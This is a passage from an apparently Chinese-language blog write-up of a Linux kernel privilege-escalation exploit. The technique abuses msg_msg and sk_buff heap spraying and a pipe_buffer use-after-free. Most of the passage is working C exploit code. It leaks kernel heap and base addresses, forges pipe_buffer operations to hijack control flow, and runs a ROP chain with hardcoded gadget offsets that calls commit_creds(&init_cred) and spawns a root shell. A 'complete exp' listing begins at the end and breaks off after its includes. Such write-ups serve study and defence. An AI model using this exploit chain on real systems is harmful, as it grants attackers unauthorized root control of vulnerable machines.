    <span class="token keyword">char</span> secondary_buf<span class="token punctuation">[</span>SECONDARY_SIZE <span class="token operator">-</span> SKB_SHARED_INFO_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">struct</span> <span class="token class-name">msg_msg</span> <span class="token operator">*</span>msg<span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> kheap<span class="token punctuation">;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Free secondary message and then gain UAF"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">read_msg</span><span class="token punctuation">(</span>msqid<span class="token punctuation">[</span>real_id<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>msg_secondary<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>msg_secondary<span class="token punctuation">)</span><span class="token punctuation">,</span> MTYPE_SECONDARY<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Spraying fake secondary messages..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memset</span><span class="token punctuation">(</span>secondary_buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>secondary_buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">build_msg_msg</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span> <span class="token operator">*</span><span class="token punctuation">)</span>secondary_buf<span class="token punctuation">,</span> <span class="token number">0x41414141</span><span class="token punctuation">,</span> <span class="token number">0x42424242</span><span class="token punctuation">,</span> PAGE_SIZE <span class="token operator">-</span> MSG_MSG_SIZE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">spray_skbuff</span><span class="token punctuation">(</span>ss<span class="token punctuation">,</span> secondary_buf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>secondary_buf<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>

    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Leaking adjacent secondary message..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">peek_msg</span><span class="token punctuation">(</span>msqid<span class="token punctuation">[</span>fake_id<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>msg_fake<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>msg_fake<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>msg_fake<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span>SECONDARY_SIZE<span class="token punctuation">]</span> <span class="token operator">!=</span> MSG_TAG<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[-] Could not leak adjacent secondary message"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    msg <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>msg_fake<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span>SECONDARY_SIZE <span class="token operator">-</span> MSG_MSG_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
    kheap <span class="token operator">=</span> msg<span class="token operator">-></span>m_list_next<span class="token punctuation">;</span> <span class="token comment">// kheap pointer to the primary message</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>kheap <span class="token operator">&amp;</span> <span class="token punctuation">(</span>PRIMARY_SIZE <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        kheap <span class="token operator">=</span> msg<span class="token operator">-></span>m_list_prev<span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] kheap = %#"</span> PRIx64 <span class="token string">"\n"</span><span class="token punctuation">,</span> kheap<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>此时的 kheap 就是相邻副消息的 m_list-&gt;next 或者 m_list-&gt;prev，指向的就是他对应的主消息<br><img src="/images/c7dcc58a/pasted-7.png" alt="leak kheap"></p>
<h4 id="leak-address-of-msg-fake"><a href="#leak-address-of-msg-fake" class="headerlink" title="leak address of msg_fake"></a>leak address of msg_fake</h4><p>释放 skb，然后伪造 <code>msg_msg-&gt;next=kheap-MSG_MSGSEG_SIZE</code>，也就是让这个主消息成为这个副消息的 msg_msgseg 结构，这样读取副消息的时候，就能把这个主消息也读出来，就能读到 m_list-&gt;next 也就是 fake_msg 相邻副消息的地址，减去 SECONDARY_SIZE 就是 msg_fake 的地址：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">
<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Freeing skb..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">free_skbuff</span><span class="token punctuation">(</span>ss<span class="token punctuation">,</span> secondary_buf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>secondary_buf<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>

<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Spraying fake secondary messages..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">memset</span><span class="token punctuation">(</span>secondary_buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>secondary_buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">build_msg_msg</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span> <span class="token operator">*</span><span class="token punctuation">)</span>secondary_buf<span class="token punctuation">,</span> <span class="token number">0x41414141</span><span class="token punctuation">,</span> <span class="token number">0x42424242</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>msg_fake<span class="token punctuation">.</span>mtext<span class="token punctuation">)</span><span class="token punctuation">,</span> kheap <span class="token operator">-</span> MSG_MSGSEG_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">spray_skbuff</span><span class="token punctuation">(</span>ss<span class="token punctuation">,</span> secondary_buf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>secondary_buf<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>

<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Leaking address of msg_fake"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">peek_msg</span><span class="token punctuation">(</span>msqid<span class="token punctuation">[</span>fake_id<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>msg_fake<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>msg_fake<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>msg_fake<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span>PAGE_SIZE<span class="token punctuation">]</span> <span class="token operator">!=</span> MSG_TAG<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[-] Could not leak address of msg_fake\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

msg <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>msg_fake<span class="token punctuation">.</span>mtext<span class="token punctuation">[</span>PAGE_SIZE<span class="token operator">-</span>MSG_MSG_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
msg_fake_addr <span class="token operator">=</span> msg<span class="token operator">-></span>m_list_next<span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>msg_fake_addr <span class="token operator">&amp;</span> <span class="token punctuation">(</span>SECONDARY_SIZE <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    msg_fake_addr <span class="token operator">=</span> msg<span class="token operator">-></span>m_list_prev<span class="token punctuation">;</span>
msg_fake_addr <span class="token operator">-=</span> SECONDARY_SIZE<span class="token punctuation">;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] address of msg_fake = %#"</span> PRIx64 <span class="token string">"\n"</span><span class="token punctuation">,</span> msg_fake_addr<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="伪造合法副消息并释放，构造-skb-可控的-UAF"><a href="#伪造合法副消息并释放，构造-skb-可控的-UAF" class="headerlink" title="伪造合法副消息并释放，构造 skb 可控的 UAF"></a>伪造合法副消息并释放，构造 skb 可控的 UAF</h4><p>有了 msg_fake 的地址，只要让 <code>msg_fake-&gt;m_list-&gt;next = msg_fake_addr</code>，随后释放副消息即可成功脱链，留下一块 skb 指向的 free 掉的内存：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Free secondary message and then gain UAF controlled by skb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">free_skbuff</span><span class="token punctuation">(</span>ss<span class="token punctuation">,</span> secondary_buf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>secondary_buf<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>

<span class="token function">build_msg_msg</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span> <span class="token operator">*</span><span class="token punctuation">)</span>secondary_buf<span class="token punctuation">,</span> msg_fake_addr<span class="token punctuation">,</span> msg_fake_addr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">spray_skbuff</span><span class="token punctuation">(</span>ss<span class="token punctuation">,</span> secondary_buf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>secondary_buf<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">read_msg</span><span class="token punctuation">(</span>msqid<span class="token punctuation">[</span>fake_id<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>msg_fake<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>msg_fake<span class="token punctuation">)</span><span class="token punctuation">,</span> MTYPE_FAKE<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">goto</span> ret<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>大概就像这样<br><img src="/images/c7dcc58a/pasted-8.png" alt="UAF2"></p>
<h3 id="skb-amp-pipe-buffer-的-UAF-利用思路"><a href="#skb-amp-pipe-buffer-的-UAF-利用思路" class="headerlink" title="skb &amp; pipe_buffer 的 UAF 利用思路"></a>skb &amp; pipe_buffer 的 UAF 利用思路</h3><h4 id="leak-kernel-base"><a href="#leak-kernel-base" class="headerlink" title="leak kernel base"></a>leak kernel base</h4><p>堆喷 pipe_buffer，利用 skb read 泄露 ops 指针，计算出 kernel 基址：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">
<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Spraying pipe_buffer objects..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NUM_PIPEFDS<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">pipe</span><span class="token punctuation">(</span>pipefd<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"[-] pipe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span>pipefd<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"xi4oyu"</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"[-] write"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Leaking and freeing pipe_buffer object..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NUM_SOCKETS<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> NUM_SKBUFFS<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>ss<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> secondary_buf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>secondary_buf<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"[-] read"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>secondary_buf<span class="token punctuation">[</span><span class="token number">0x10</span><span class="token punctuation">]</span> <span class="token operator">!=</span> MTYPE_FAKE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            pipe_buffer_ops <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>secondary_buf<span class="token punctuation">[</span><span class="token number">0x10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

kernel_offset  <span class="token operator">=</span> pipe_buffer_ops <span class="token operator">-</span> <span class="token number">0xffffffff8223e140</span><span class="token punctuation">;</span>  <span class="token comment">// anon_pipe_buf_ops</span>
kernel_base <span class="token operator">=</span> kernel_offset <span class="token operator">+</span> <span class="token number">0xffffffff81000000</span><span class="token punctuation">;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] pipe_buffer_ops = %#"</span> PRIx64 <span class="token string">"\n"</span><span class="token punctuation">,</span> pipe_buffer_ops<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] kernel_base = %#"</span> PRIx64 <span class="token string">"\n"</span><span class="token punctuation">,</span> kernel_base<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] kernel_offset = %#"</span> PRIx64 <span class="token string">"\n"</span><span class="token punctuation">,</span> kernel_offset<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="hijack-control-follow"><a href="#hijack-control-follow" class="headerlink" title="hijack control follow"></a>hijack control follow</h4><p>skb 堆喷伪造 pipe_buffer，劫持 ops 指针，劫持程序控制流，当关闭管道时，最后进入下面的函数释放 pipe_buffer，可知 rsi 指向 pipe_buffer，可以栈迁移到 pipe_buffer，随后 ROP</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">void</span> <span class="token function">pipe_buf_release</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">pipe_inode_info</span> <span class="token operator">*</span>pipe<span class="token punctuation">,</span>
				    <span class="token keyword">struct</span> <span class="token class-name">pipe_buffer</span> <span class="token operator">*</span>buf<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">pipe_buf_operations</span> <span class="token operator">*</span>ops <span class="token operator">=</span> buf<span class="token operator">-></span>ops<span class="token punctuation">;</span>

	buf<span class="token operator">-></span>ops <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	ops<span class="token operator">-></span><span class="token function">release</span><span class="token punctuation">(</span>pipe<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ROP 执行 <code>commit_creds(&amp;init_cred)</code> 提权，平衡栈最后回到用户态起 shell 即可，具体操作如下：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Spraying fake pipe_buffer..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">memset</span><span class="token punctuation">(</span>secondary_buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>secondary_buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
buf <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">pipe_buffer</span> <span class="token operator">*</span><span class="token punctuation">)</span>secondary_buf<span class="token punctuation">;</span>
buf<span class="token operator">-></span>ops <span class="token operator">=</span> msg_fake_addr <span class="token operator">+</span> <span class="token number">0x200</span><span class="token punctuation">;</span>
ops <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">pipe_buf_operations</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>secondary_buf<span class="token punctuation">[</span><span class="token number">0x200</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

ops<span class="token operator">-></span>release <span class="token operator">=</span> kernel_offset <span class="token operator">+</span> <span class="token number">0xffffffff8172e1ac</span><span class="token punctuation">;</span> <span class="token comment">// push rsi ; jmp qword ptr [rsi + 0x39]</span>

<span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>secondary_buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> kernel_offset <span class="token operator">+</span> <span class="token number">0xffffffff8106f8c9</span><span class="token punctuation">;</span>  <span class="token comment">// add rsp, 0xd0 ; ret</span>
<span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>secondary_buf<span class="token punctuation">[</span><span class="token number">0x39</span><span class="token punctuation">]</span> <span class="token operator">=</span> kernel_offset <span class="token operator">+</span> <span class="token number">0xffffffff81163ea0</span><span class="token punctuation">;</span>  <span class="token comment">// pop rsp ; ret</span>
rop <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>secondary_buf<span class="token punctuation">[</span><span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
ridx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
rop<span class="token punctuation">[</span>ridx<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> kernel_offset <span class="token operator">+</span> <span class="token number">0xffffffff8108c650</span><span class="token punctuation">;</span>  <span class="token comment">// pop rdi ; ret</span>
rop<span class="token punctuation">[</span>ridx<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> kernel_offset <span class="token operator">+</span> <span class="token number">0xffffffff8286b780</span><span class="token punctuation">;</span>  <span class="token comment">// init_cred</span>
rop<span class="token punctuation">[</span>ridx<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> kernel_offset <span class="token operator">+</span> <span class="token number">0xffffffff810c9f00</span><span class="token punctuation">;</span>  <span class="token comment">// commit_creds</span>
rop<span class="token punctuation">[</span>ridx<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> kernel_offset <span class="token operator">+</span> <span class="token number">0xffffffff8108c5bc</span><span class="token punctuation">;</span>  <span class="token comment">// mov rsp, rbp ; pop rbp ; ret</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">spray_skbuff</span><span class="token punctuation">(</span>ss<span class="token punctuation">,</span> secondary_buf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>secondary_buf<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>

<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Releasing pipe_buffer objects..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NUM_PIPEFDS<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">close</span><span class="token punctuation">(</span>pipefd<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"[-] close"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">close</span><span class="token punctuation">(</span>pipefd<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"[-] close"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">goto</span> ret<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>完整 exp 如下：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// gcc -m32 -static -o exp exp.c</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ipc.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/msg.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/socket.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;net/if.h></span></span>
